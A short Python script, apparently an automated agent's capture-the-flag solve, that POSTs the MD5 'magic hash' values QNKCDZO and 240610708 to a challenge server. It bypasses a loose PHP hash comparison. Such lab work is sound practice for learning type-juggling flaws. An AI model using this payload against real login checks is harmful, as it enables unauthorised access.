import urllib.parse
import urllib.request
import traceback

url = "http://node7.anna.nssctf.cn:26820/?name=QNKCDZO"
data = urllib.parse.urlencode({"password": "240610708"}).encode()
req = urllib.request.Request(url, data=data, method="POST")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
req.add_header("User-Agent", "ctf-agent")

try:
    with urllib.request.urlopen(req, timeout=10) as r:
        print("STATUS", r.status)
        print(r.read().decode("utf-8", "replace"))
except Exception:
    traceback.print_exc()
